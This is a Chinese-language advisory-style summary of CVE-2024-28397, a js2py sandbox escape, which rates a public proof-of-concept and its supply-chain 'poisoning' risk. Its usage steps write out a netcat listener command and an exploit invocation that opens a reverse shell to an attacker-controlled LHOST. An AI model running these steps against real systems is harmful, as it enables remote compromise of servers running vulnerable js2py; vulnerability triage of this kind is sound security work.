## CVE-2024-28397 - js2py Sandbox Escape/Remote Code Execution

**漏洞编号:** CVE-2024-28397

**漏洞类型:** Sandbox Escape/Remote Code Execution

**影响应用:** js2py

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** <= 0.74

**利用条件:** Requires a target URL endpoint where JavaScript code can be executed.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2024-28397是js2py <= 0.74中的一个严重漏洞，允许沙箱逃逸和远程代码执行。js2py是一个流行的Python库，用于在Python环境中评估JavaScript代码。此漏洞允许攻击者逃脱js2py沙箱环境并执行任意Python/系统命令，即使启用了'js2py.disable_pyimport()'。该漏洞利用Python的对象自省功能，通过JavaScript访问'subprocess.Popen'类并执行系统命令。

POC有效性分析：提供的POC代码是一个完整的利用程序，它使用JavaScript代码访问Python的内部对象，并找到'subprocess.Popen'类来执行任意命令。该POC包含完整的利用链，包括Payload生成、沙箱逃逸、进程执行和命令执行。给定目标URL，Local IP和端口，该POC能够建立反向shell。该利用利用了Python的内部结构，通过反射来绕过沙箱限制，展示了js2py库的安全隐患。该POC经过测试，在漏洞版本上运行有效。

利用步骤：
1. 安装requests库：'pip install requests'
2. 启动netcat监听器：'nc -lnvp 4444'
3. 运行exploit.py脚本，提供目标URL、LHOST和LPORT作为参数：'python3 exploit.py --target http://target.com:8000/run_code --lhost 10.10.14.100 --lport 4444'
4. 成功利用后，攻击者的机器上将建立一个反向shell。

投毒风险分析：该POC的投毒风险较低，约为15%。原因是该POC代码清晰，主要使用标准库如'requests'，没有明显的代码混淆。POC主要功能是利用漏洞，而不是进行恶意活动。虽然POC执行系统命令，但这部分是利用漏洞的必要步骤，而不是额外的恶意行为。该POC没有连接任何外部脚本或资源，降低了被植入恶意代码的风险。但是，如果攻击者修改该POC，例如添加下载和执行恶意文件的功能，则投毒风险会大大增加。因此，在使用和分享此类POC时，需要保持警惕，并进行代码审查，以确保其安全性。

**项目地址:** None

**漏洞详情:** None
